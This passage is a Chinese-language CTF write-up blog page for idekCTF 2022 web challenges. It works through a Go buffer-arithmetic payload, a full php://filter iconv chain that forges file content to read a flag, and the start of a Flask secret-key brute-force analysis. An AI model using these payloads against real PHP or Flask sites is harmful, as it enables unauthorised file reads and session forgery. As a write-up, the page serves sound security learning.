@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="idekctf2022的部分web" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            idekctf2022的部分web
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-Readme"><span class="post-toc-text">Web&#x2F;Readme</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x01 题解</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-Paywall-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;Paywall(复现)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-1"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%A2%98%E8%A7%A3-1"><span class="post-toc-text">0x01 题解</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-SimpleFileServe-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;SimpleFileServe(复现)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-2"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 题解</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-task-manager-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;task manager(复现)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-3"><span class="post-toc-text">0x00</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87TaskManager%E5%BE%97%E5%88%B0app%E5%AF%B9%E8%B1%A1"><span class="post-toc-text">通过TaskManager得到app对象</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%80%9A%E8%BF%87eval%E8%BF%9B%E8%A1%8Crce"><span class="post-toc-text">0x01 通过eval进行rce</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%87%8D%E5%A4%8D%E8%B0%83%E7%94%A8-app-before-first-request"><span class="post-toc-text">重复调用@app.before_first_request</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="post-toc-text">任意文件读取</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BF%AE%E6%94%B9%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="post-toc-text">修改闭合字符串</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="post-toc-text">寻找可以利用的文件，并设置闭合字符串</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E8%A6%86%E7%9B%96%E7%BC%96%E8%AF%91%E6%97%B6%E9%9C%80%E8%A6%81%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8Crce"><span class="post-toc-text">0x02 通过覆盖编译时需要的值进行rce</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-Proxy-Viewer-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;Proxy Viewer(复现)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-4"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3-1"><span class="post-toc-text">0x02 题解</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-downgrade%E5%A4%A7%E5%93%A5%E7%9A%84wp%E5%92%8Cexp"><span class="post-toc-text">0x03 downgrade大哥的wp和exp</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我爱idekctf！！！！有dockerfile真是太棒了</p>
+<p>因为实在不会前端，所以暂时只复现非xss的题目</p>
+<p>题目附件我都放在了<a target="_blank" rel="noopener" href="https://github.com/v2ish1yan/ctf-attachments">这儿</a></p>
+<h1 id="Web-Readme"><a href="#Web-Readme" class="headerlink" title="Web&#x2F;Readme"></a>Web&#x2F;Readme</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>一个代码审计题，用的go语言，平常接触的不多，看了很久的文档，所以做的有些慢</p>
+<p>参考文章:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://pkg.go.dev/">Go packages</a></li>
+</ul>
+<h2 id="0x01-题解"><a href="#0x01-题解" class="headerlink" title="0x01 题解"></a>0x01 题解</h2><p>这里主要是要让从randomData里读取到的切片刚好等于password</p>
+<p>这个password的值是固定的，而且原生randomData的值也是固定的</p>
+<p>从一下代码可以知道，题目将password的值放进了randomData[12625:]切片</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initRandomData</span><span class="params">()</span></span> &#123; <span class="comment">//初始化随机数</span></span><br><span class="line">	rand.Seed(<span class="number">1337</span>)</span><br><span class="line">	randomData = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">24576</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := rand.Read(randomData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">copy</span>(randomData[<span class="number">12625</span>:], password[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后后面的代码就是根据你输入的值，然后依次根据索引值在randomData读取数据，最后一次是读取32位，就刚好和password的长度一样</p>
+<p>传入数据的格式为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;orders&quot;</span>:[1,2,3,xxx]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数组要求元素个数不多于10个，且大小在大于0小于等于100</p>
+<p>而且我们最终要得到的数据索引值在12625，这么小的数据再怎么加都不可能到12625</p>
+<p>源码中有一个关键的代码，在<code>GetValidatorCtxData()</code>中</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetValidatorCtxData</span><span class="params">(ctx context.Context)</span></span> (io.Reader, <span class="type">int</span>) &#123;</span><br><span class="line">	reader := ctx.Value(reqValReaderKey).(io.Reader)</span><br><span class="line">	size := ctx.Value(reqValSizeKey).(<span class="type">int</span>)</span><br><span class="line">	<span class="keyword">if</span> size &gt;= <span class="number">100</span> &#123;</span><br><span class="line">		reader = bufio.NewReader(reader)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> reader, size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果size&gt;&#x3D;100，就用bufio.NewReader()来新建Reader，并且其缓冲区大小默认为4096</p>
+<p>这样就好办了，就变成了数学题</p>
+<p>所以当我们传入100的时候，这里返回的reader里的buf的值就会变成4096</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301141655010.png" title="image-20230114165511864" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301141655010.png" alt="image-20230114165511864"></a></p>
+<p>最后传入这里</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reader)</span></span> Read(b []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> r.i &gt;= <span class="type">int64</span>(<span class="built_in">len</span>(r.s)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, io.EOF</span><br><span class="line">	&#125;</span><br><span class="line">	r.prevRune = <span class="number">-1</span></span><br><span class="line">	n = <span class="built_in">copy</span>(b, r.s[r.i:])</span><br><span class="line">	r.i += <span class="type">int64</span>(n)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的n被为<code>copy(b, r.s[r.i:])</code>成功复制的个数，又因为b的大小为4096，所以n会变成4096。</p>
+<p>r.i最开始为0，然后会加上4096</p>
+<p>所以每一次执行到这里的时候，如果我们最开始传入的值为100，那么这里就会加上4096</p>
+<p>到这里就可以进行算术题了</p>
+<p>虽然最后面存在一个</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf, err := v.Read(WithValidatorCtx(ctx, r, <span class="number">32</span>))</span><br></pre></td></tr></table></figure>
+
+<p>但是这个只是用来取32个值用的，所以没啥影响</p>
+<p>(12625-32)mod4096&#x3D;305</p>
+<p>305&#x3D;5*61</p>
+<p>所以最后的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;orders&quot;</span>:[61,61,61,61,61,100,100,100,32]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还可以是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;orders&quot;</span>:[60,60,60,60,60,100,100,100,37]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自己算吧</p>
+<h1 id="Web-Paywall-复现"><a href="#Web-Paywall-复现" class="headerlink" title="Web&#x2F;Paywall(复现)"></a>Web&#x2F;Paywall(复现)</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>使用php:&#x2F;&#x2F;filter来构造字符串</p>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_iconv-filter-chain">hxp CTF 2021 - The End Of LFI?</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a></li>
+<li>[ctftime&#96;s wp](<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36071">https://ctftime.org/writeup/36071</a>)</li>
+</ul>
+<p>工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a></li>
+</ul>
+<h2 id="0x01-题解-1"><a href="#0x01-题解-1" class="headerlink" title="0x01 题解"></a>0x01 题解</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;articles/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$article_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$article_content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$article_content</span>, <span class="string">&#x27;PREMIUM&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$article_content</span>, <span class="string">&#x27;FREE&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;article&gt;<span class="subst">$article_content</span>&lt;/article&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nothing here&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就是要让我们包含的文件以FREE开头才会打印出来，使用php:&#x2F;&#x2F;filter通过字符集的转变来构造字符串’FREE’</p>
+<p>使用这个工具（github:<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>)</p>
+<p>FREE后面有两个空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&quot;FREE  &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.I</span><br><span class="line">BM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode</span><br><span class="line">|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.icon</span><br><span class="line">v.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|</span><br><span class="line">convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|</span><br><span class="line">convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32L</span><br><span class="line">E|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></pre></td></tr></table></figure>
+
+<p>发送payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://paywall.chal.idek.team:1337/?p=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.I</span><br><span class="line">BM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode</span><br><span class="line">|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.icon</span><br><span class="line">v.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|</span><br><span class="line">convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|</span><br><span class="line">convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32L</span><br><span class="line">E|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301172119246.png" title="image-20230117211940137" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301172119246.png" alt="image-20230117211940137"></a></p>
+<h1 id="Web-SimpleFileServe-复现"><a href="#Web-SimpleFileServe-复现" class="headerlink" title="Web&#x2F;SimpleFileServe(复现)"></a>Web&#x2F;SimpleFileServe(复现)</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>题目环境是flask</p>
+<p>要我们爆破得到secret_key,来伪造session</p>
+<p>利用符号链接文件来获得特定文件</p>
+<p>参考文章:</p>
+<ul>
+<li>[Alberto FDR&#96;s write up](<a target="_blank" rel="noopener" href="https://albertofdr.github.io/post/ctf-idek-2023/">https://albertofdr.github.io/post/ctf-idek-2023/</a>)</li>
+</ul>
+<p>工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">Flask-Unsign</a></li>
+</ul>
+<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><p>题目<code>dockerfile</code></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src/ /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 4755 flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 600 flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> nobody</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> bash -c <span class="string">&quot;mkdir /tmp/uploadraw /tmp/uploads &amp;&amp; sqlite3 /tmp/database.db \&quot;CREATE TABLE users(username text, password text, admin boolean)\&quot; &amp;&amp; /usr/local/bin/gunicorn --bind 0.0.0.0:1337 --config config.py --log-file /tmp/server.log wsgi:app&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里是分别赋予了flag.txt 600的权限，只有root可以读写</p>
+<p>将gunicorn的log文件设置为&#x2F;tmp&#x2F;server.log</p>
+<p>使用config.py作为配置文件</p>
+<p><code>config.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">SECRET_OFFSET = <span class="number">0</span> <span class="comment"># REDACTED</span></span><br><span class="line">random.seed(<span class="built_in">round</span>((time.time() + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里告诉了我们secret_key是如何生成的</p>
